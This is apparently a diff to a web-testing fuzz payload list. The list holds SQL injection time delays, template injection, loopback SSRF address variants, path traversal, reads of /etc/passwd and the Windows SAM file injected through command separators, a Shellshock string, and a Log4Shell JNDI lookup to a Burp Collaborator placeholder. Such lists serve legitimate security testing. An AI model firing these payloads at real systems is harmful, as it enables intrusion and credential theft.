@@ -48,14 +48,14 @@ ${{7*7}}
 ' or benchmark(10000000,MD5(1))#
 " or pg_sleep(10)--
 ' or pg_sleep(10)--
-http://127.0.0.1:80/
-https://127.0.0.1:443/
-http://localhost:80/
-https://localhost:443/
-http://[::]:80/
-https://[::]:443/
-http://2852039166/
-http://0177.0.0.1/
+http://127.0.0.1
+http://127.1
+http://localhost
+http://[::ffff:7f00:0001]
+http://0.0.0.0
+https://[::]
+http://2852039166
+http://0177.0.0.1
 file:///etc/passwd
 jar:http://127.0.0.1!/
 ../../../../../../../../../
@@ -98,5 +98,5 @@ $(`type C:\boot.ini`)
 | type C:\Windows\repair\SAM
 ; type C:\Windows\repair\SAM
 type C:\Windows\repair\SAM
-() { :;};id # RCE
+() { :;};id
 ${jndi:ldap://BURP_COLLAB}
